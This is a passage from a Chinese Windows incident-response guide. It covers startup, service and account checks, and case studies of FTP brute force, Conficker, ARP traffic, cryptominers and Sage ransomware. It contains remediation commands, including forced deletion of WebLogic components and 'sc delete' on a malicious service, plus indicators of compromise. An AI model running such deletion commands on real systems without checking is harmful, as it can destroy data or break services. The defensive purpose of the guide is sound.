  d、回收站、浏览器下载目录、浏览器历史记录

  e、修改时间在创建时间之前的为可疑文件

3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？

 a、利用 [Registry Workshop](http://www.torchsoft.com/en/rw_information.html) 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。 b、利用计算机自带文件搜索功能，指定修改时间进行搜索。

## [检查启动项，计划任务，服务](#检查启动项计划任务服务)

1、检查服务器是否有异常的启动项。

- 检查方法：

  a、登录服务器，单击【开始】>【所有程序】>【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。 b、单击开始菜单 >【运行】，输入 `msconfig`，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。 c、单击【开始】>【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：

  ```
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run
  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce
  ```

  检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。

  ![68040434335](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/2176e546e47a2db868a529aad3f0a878.png)

  d、利用安全软件查看启动项、开机时间管理等。

  e、组策略，运行 `gpedit.msc`

  ![68040447339](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/eaaf8af4811ce53de948774105230039.png)

2、检查计划任务

- 检查方法：

  a、单击【开始】>【设置】>【控制面板】>【任务计划】，查看计划任务属性，便可以发现木马文件的路径。

  b、单击【开始】>【运行】；输入 `cmd`，然后输入 `at`，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。

3、服务自启动

- 检查方法：单击【开始】>【运行】，输入 `services.msc`，注意服务状态和启动类型，检查是否有异常服务。

## [系统账号](#系统账号)

1、查看服务器是否弱口令，远程管理端口是否对公网开放。

- 检查方法：据实际情况咨询相关服务器管理员

2、查看服务器是否存在可以账号，新增账号。

- 检查方法：打开cmd窗口，输入lusrmgr.msc命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。

![68031310273](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/af481662ac6d3681cd78d7b3ecc4356a.png)

3、查看服务器是否存在隐藏账号、克隆账号。

![68031360652](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/682bf54dce52001655a7aafe4146a9a6.png)

检查方法：

a、 打开注册表，查看管理员对应键值或者通过cmd命令。

![68031375197](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/8b15f0c68a0e078e710b830c5a534c6a.png)

b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。

![68031402508](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/003c5e8d8e65b31150f53317fb97727f.png)

4、结合日志，查看管理员登录时间、用户名是否存在异常。

- 检查方法：

  a、Win+R 打开运行，输入"eventvwr.msc"，回车运行，打开“事件查看器”。

  b、导出 Windows 日志 -- 安全，利用微软官方工具 [Log Parser](https://www.microsoft.com/en-us/download/details.aspx?id=24659) 进行分析。

## [工具](#工具)

### [病毒分析](#病毒分析)

PCHunter：http://www.xuetr.com

火绒剑：https://www.huorong.cn

Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer

processhacker：https://processhacker.sourceforge.io/downloads.php

autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

OTL：https://www.bleepingcomputer.com/download/otl/

SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector

### [病毒查杀](#病毒查杀)

卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新病毒库）

大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）

火绒安全软件：https://www.huorong.cn

360杀毒：http://sd.360.cn/download_center.html

### [病毒动态](#病毒动态)

CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn

微步在线威胁情报社区：https://x.threatbook.cn

火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html

爱毒霸社区：http://bbs.duba.net

腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html

### [在线病毒扫描网站](#在线病毒扫描网站)

Virustotal：https://www.virustotal.com

Virscan：http://www.virscan.org

腾讯哈勃分析系统：https://habo.qq.com

Jotti 恶意软件扫描系统：https://virusscan.jotti.org

### [webshell查杀](#webshell查杀)

D盾_Web查杀：http://www.d99net.net/index.asp

河马 WebShell 查杀：http://www.shellpub.com

# 实战篇

## [FTP暴力破解](#ftp暴力破解)

FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。

### [应急场景](#应急场景)

网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：

![68164989321](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/fd3ccc6d94679055255e3f47f4bb8384.png)

### [日志分析](#日志分析)

**安全日志分析：**

安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。

打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/354702cabe9d9e1edab365bbbefd845c.png)

进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/3eeb79b01e9568cacd39a68f492e6ad0.png)

这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？

**登录类型8：网络明文（NetworkCleartext）** 

这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。

我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/fa7ad739920709b5ecf269d7cdd14b8b.png)

另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/ca97b9ba3935dcbf6eb82f8621f1268a.png)

通过对近段时间的管理员登录日志进行分析，如下：

![68165001103](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/f28d52efe9e8594f9e13d0a085fa0f7d.png)

管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。

另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/e98e19ff1ff049d9fbd40f26abb7c646.png)

### [应急处理措施](#应急处理措施)

1. 关闭外网FTP端口映射
2. 删除本地服务器FTP测试

### [处理措施](#处理措施)

 FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：

```
1、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。
2、更改服务器FTP默认端口。
3、部署入侵检测设备，增强安全防护。
```

## [蠕虫病毒](#蠕虫病毒)

蠕虫病毒是一种十分古老的计算机病毒，它是一种自包含的程序（或是一套程序），通常通过网络途径传播，每入侵到一台新的计算机，它就在这台计算机上复制自己，并自动执行它自身的程序。

常见的蠕虫病毒：

1. 熊猫烧香病毒
2. 冲击波/震荡波病毒
3. `conficker`病毒

### [应急场景](#应急场景)

某天早上，管理员在出口防火墙发现内网服务器不断向境外IP发起主动连接，内网环境，无法连通外网，无图脑补。

### [事件分析](#事件分析)

在出口防火墙看到的服务器内网IP，首先将中病毒的主机从内网断开，然后登录该服务器，打开D盾_web查杀查看端口连接情况，可以发现本地向外网IP发起大量的主动连接：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/582e935fe4e1e360292294ff6fcc62c4.png)

通过端口异常，跟踪进程ID，可以找到该异常由svchost.exe windows服务主进程引起，svchost.exe向大量远程IP的445端口发送请求：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/497f0161788f8b5cbf707f22d1c02df0.png)

这里我们推测可以系统进程被病毒感染，使用卡巴斯基病毒查杀工具，对全盘文件进行查杀，发现`c:\windows\system32\qntofmhz.dll`异常：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/c91b71daa5a88a15727db1c1b45cc3f7.png)

使用多引擎[在线病毒扫描](http://www.virscan.org/) 对文件进行扫描，确认服务器感染conficker蠕虫病毒，下载conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/84f82c9685cfdfceb1d08af54b8030cf.png)

大致的处理流程如下:

1. 发现异常：出口防火墙、本地端口连接情况，主动向外网发起大量连接
2. 病毒查杀：卡巴斯基全盘扫描，发现异常文件
3. 确认病毒：使用多引擎在线病毒对该文件扫描，确认服务器感染conficker蠕虫病毒。
4. 病毒处理：使用conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。

### [预防处理措施](#预防处理措施)

在政府、医院内网，依然存在着一些很古老的感染性病毒，如何保护电脑不受病毒感染，总结了几种预防措施：

1. 安装杀毒软件，定期全盘扫描
2. 不使用来历不明的软件，不随意接入未经查杀的U盘
3. 定期对windows系统漏洞进行修复，不给病毒可乘之机
4. 做好重要文件的备份，备份，备份。

## [ARP攻击](#arp攻击)

ARP病毒并不是某一种病毒的名称，而是对利用arp协议的漏洞进行传播的一类病毒的总称，目前在局域网中较为常见。发作的时候会向全网发送伪造的ARP数据包，严重干扰全网的正常运行，其危害甚至比一些蠕虫病毒还要严重得多。

### [应急场景](#应急场景)

`192.168.64.76`主机`CPU`现在负载很高，在日志分析平台查看了一下这台服务器的相关日志，流量在某个时间点暴涨，发现大量137端口的`UDP`攻击。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/e5db6728ee0deab79d427b69c2108304.png)

### [分析过程](#分析过程)

　　登录服务器，首先查看137端口对应的进程，进程ID为4对应的进程是SYSTEM，于是使用杀毒软件进行全盘查杀。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/4e0f3672aaabf3832f1b66b937d0cc56.png)

卡巴斯基绿色版：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe

卡巴斯基、360杀毒、McAfee查杀无果，手工将启动项、计划任务、服务项都翻了一遍，并未发现异常。 本地下载了IpTool抓包工具，筛选条件： 协议 UDP 端口 137

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/34dea67c75dc6094aebb5c8a181bc8fe.png)

可以明显的看出192.168.64.76发送的数据包是异常的，192.168.64.76的数据包目的地址，一直在变，目的MAC是不变的，而这个MAC地址就是网关的MAC。

端口137的udp包是netbios的广播包，猜测：可能是ARP病毒，由本机对外的ARP攻击。

采用措施：通过借助一些安全软件来实现局域网ARP检测及防御功能。

服务器安全狗Windows版下载：http://free.safedog.cn/server_safedog.html

网络防火墙--攻击防护--ARP防火墙：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/56d563403b16f2adc9a4e4c4e2233e05.png)

虽然有拦截了部分ARP请求，但流量出口还是有一些137 UDF的数据包。

看来还是得下狠招，关闭137端口：禁用TCP/IP上的NetBIOS。

1. 禁用Server服务

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/c2f2ce5660f9af9950e9da1f7294c328.png)

1. 禁用 TCP/IP 上的 NetBIOS

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/f96862238f2e042574336993e964287b.png)

设置完，不用重启即可生效，137端口关闭，观察了一会，对外发起的请求已消失，CPU和网络带宽恢复正常。

### [防护措施](#防护措施)

局域网安全防护依然是一项很艰巨的任务，网络的安全策略，个人/服务器的防毒机制，可以在一定程度上防止病毒入侵。

另外不管是个人PC还是服务器，总还是需要做一些基本的安全防护：

1. 关闭135/137/138/139/445等端口，无法关闭做好访问控制
2. 及时更新系统补丁

## [挖矿病毒（一）](#挖矿病毒一)

随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。

### [应急场景](#应急场景)

重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/d7ad5167fc378d27f4dd0d662c8d5089.png)

### [事件分析](#事件分析)

登录网站服务器进行排查，发现多个异常进程：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/b8d8b50d9c9403f826d57f75b40b6688.png)

分析进程参数：

wmic process get caption,commandline /value >> tmp.txt

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/56d357d8c6687e09983ebfa88cea7c7b.png)

**TIPS:**

```
在windows下查看某个运行程序（或进程）的命令行参数
使用下面的命令：
wmic process get caption,commandline /value
如果想查询某一个进程的命令行参数，使用下列方式：
wmic process where caption=”svchost.exe” get caption,commandline /value
这样就可以得到进程的可执行文件位置等信息。
```

访问该链接：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/692e1bb37b1a047ede4a6f44355a7e06.png)

Temp目录下发现Carbon、run.bat挖矿程序:

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/af1bbc672fdf76c11b1ee94356c8ae1b.png)

具体技术分析细节详见：

> 360CERT：利用WebLogic漏洞挖矿事件分析
>
> https://www.anquanke.com/post/id/92223

清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。

### [临时防护方案](#临时防护方案)

1. 根据实际环境路径，删除WebLogic程序下列war包及目录

```bash
$ sudo rm -f you-path/wls-wsat.war
$ sudo rm -f  you-path/wls-wsat.war
$ sudo rm -rf  you-path/wls-wsat 
```

1. 重启WebLogic或系统后，确认以下链接访问是否为404

```url
http://x.x.x.x:7001/wls-wsat
```

### [防范措施](#防范措施)

新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率。

通过利用永恒之蓝（`EternalBlue`）、web攻击多种漏洞，如`Tomca`t弱口令攻击、`Weblogic WLS`组件漏洞、`Jboss`反序列化漏洞，`Struts2`远程命令执行等，导致大量服务器被感染挖矿程序的现象 。

根据以往经验总结几种预防措施：

1. 安装安全软件并升级病毒库，定期全盘扫描，保持实时防护
2. 及时更新 Windows安全补丁，开启防火墙临时关闭端口
3. 及时更新web漏洞补丁，升级web组件

## [挖矿病毒（二）](#挖矿病毒二)

遇到了比较复杂的病毒怎么办？别怕，虽然对二进制不熟，但是依靠系统运维的经验，我们可以用自己的方式来解决它。

### [应急场景](#应急场景)

1、向大量远程IP的445端口发送请求

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/5ee372c56dc0941bc5d8fb2359429128.png)

2、使用各种杀毒软件查杀无果，虽然能识别出在`C:\Windows\NerworkDistribution`中发现异常文件，但即使删除`NerworkDistribution`后，每次重启又会再次生成。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/245508d7e2e0e682900f7cb092771692.jpeg)

连杀软清除不了的病毒，只能手工来吧，个人比较偏好火绒，界面比较简洁，功能也挺好用的，自带的火绒剑是安全分析利器。于是安装了火绒，有了如下分析排查过程。

### [事件分析](#事件分析)

#### [网络链接](#网络链接)

通过现象，找到对外发送请求的进程`ID：4960`

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/168a5f0b8985c0ff1278c15f0bc8e50d.png)

#### [进程分析](#进程分析)

进一步通过进程ID找到相关联的进程，父进程为1464

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/dd6274801c1c1832ec4d512c184216a5.png)

找到进程ID为1464的服务项，逐一排查，我们发现服务项RemoteUPnPService存在异常。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/b94161cb30fbdf97d0ac2c10559831af.png)

#### [删除服务](#删除服务)

选择可疑服务项，右键属性，停止服务，启动类型：禁止。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/4a9f947d9f5588860318670119d30ee2.png)

停止并禁用服务，再清除NerworkDistribution目录后，重启计算机。异常请求和目录的现象消失。

又排查了几台，现象一致，就是服务项的名称有点变化。

![img](E:/Typroa/Typora/image/win-10-7.png)

#### [病毒清除](#病毒清除)

挖矿病毒清除过程如下：

1、 停止并禁用可疑的服务项，服务项的名称会变，但描述是不变的，根据描述可快速找到可疑服务项。

 可疑服务项描述：`Enables a common interface and object model for the Remote UPnP Service to access`

 删除服务项：`Sc delete RemoteUPnPService`

2、 删除`C:\Windows\NerworkDistribution`目录

3、 重启计算机

4、 使用杀毒软件全盘查杀

5、 到微软官方网站下载对应操作系统补丁，下载链接：

　　https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010

## [勒索病毒](#勒索病毒)

勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。

### [应急场景](#应急场景)

全盘文件突然被加密，并且弹出支付窗口。

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/3cd7fc1c0155efdab34736bb25e51a3f.png)

### [事件分析](#事件分析)

登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为`.sage`结尾的文件，每个文件夹下都有一个`!HELP_SOS.hta`文件，打包了部分样本：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/1ffa7223656d8a9a7359e08b9442e95a.png)

打开`!HELP_SOS.hta`文件，显示如下：

![img](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/84842ee3ec98505dce0415b6a60fc7fb.png)

到这里，基本可以确认是服务器中了勒索病毒，上传样本到[360勒索病毒网站](http://lesuobingdu.360.cn)进行分析：确认web服务器中了`sag`e勒索病毒，目前暂时无法解密。

![68165395052](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/7f7b66e23ff184ee1c8f17972f0e6106.png)

绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。

遇到了，别急，试一试勒索病毒解密工具：

- [拒绝勒索软件](https://www.nomoreransom.org/zh/index.html)
- [360安全卫士勒索病毒专题](http://lesuobingdu.360.cn)

### [防范措施](#防范措施)

一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：

1. 安装杀毒软件，保持监控开启，定期全盘扫描
2. 及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口
3. 及时更新web漏洞补丁，升级web组件
4. 备份。重要的资料一定要备份，谨防资料丢失
5. 强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开



引用：https://sso.secself.com/?return_url=http://security-incident-respons.secself.com/linux/logs-system.html